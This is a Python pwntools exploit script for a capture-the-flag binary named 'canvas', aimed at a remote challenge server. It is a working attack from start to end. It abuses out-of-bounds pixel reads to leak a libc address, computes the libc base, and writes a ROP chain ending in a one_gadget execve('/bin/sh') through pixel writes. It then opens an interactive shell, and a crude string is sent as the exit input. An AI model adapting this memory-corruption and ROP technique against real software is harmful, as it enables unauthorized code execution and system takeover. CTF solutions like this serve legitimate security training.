#!/usr/bin/env python3

from pwn import *

exe = ELF("./canvas_patched")       # This one is patched so we have the loader integrated
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL
'''


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("canvas.challs.cyberchallenge.it", 9603)

    return r



def draw_pixel(x: int, y: int, val: int):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'X: ', str(x).encode('ascii'))
    r.sendlineafter(b'Y: ', str(y).encode('ascii'))
    r.sendlineafter(b'Value (0-255): ', str(val).encode('ascii'))

    return



def resize_img(size: int):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'New dimension: ', str(size).encode('ascii'))      # NOTE: Minimum size to leak the necessary addresses is 31

    return



def leak_libc_base_addr():
    r.sendlineafter(b'> ', b'3')

    output = r.recvlinesS(3)[-1][402:438]   # Discard garbage and retrieve the address we want to leak
    output = ''.join([ output[i] + output[i + 1] for i in range(0, len(output), 6) ][::-1])     # Reverse it and transform it to a string
    log.info(f'Leaked address of "__libc_start_main+243": 0x0000{output}')

    libc.address = int(output, 16) - 243 - libc.symbols['__libc_start_main']
    log.info(f'LIBC base address: {hex(libc.address)}')

    return



def spawn_shell(size: int):
    rop = ROP(libc)

    pop_r15 = rop.find_gadget(['pop r15', 'ret'])[0]
    pop_r12 = rop.find_gadget(['pop r12', 'ret'])[0]
    one_gadget = libc.address + 0xe3afe

    payload = p64(pop_r15) + p64(0) + p64(pop_r12) + p64(0) + p64(one_gadget)

    x, y = 17, 29
    for byte in payload:
        draw_pixel(x, y, byte)
        y += (x + 1) // size
        x = (x + 1) % size

    r.sendlineafter(b'> ', b'g3t_pwn3d_b!tch')      # Exit and let the rop chain do the job :)

    return



def main():
    r = conn()

    size = 31

    resize_img(size)
    leak_libc_base_addr()
    spawn_shell(size)

    r.interactive('$ ')


if __name__ == "__main__":
    main()
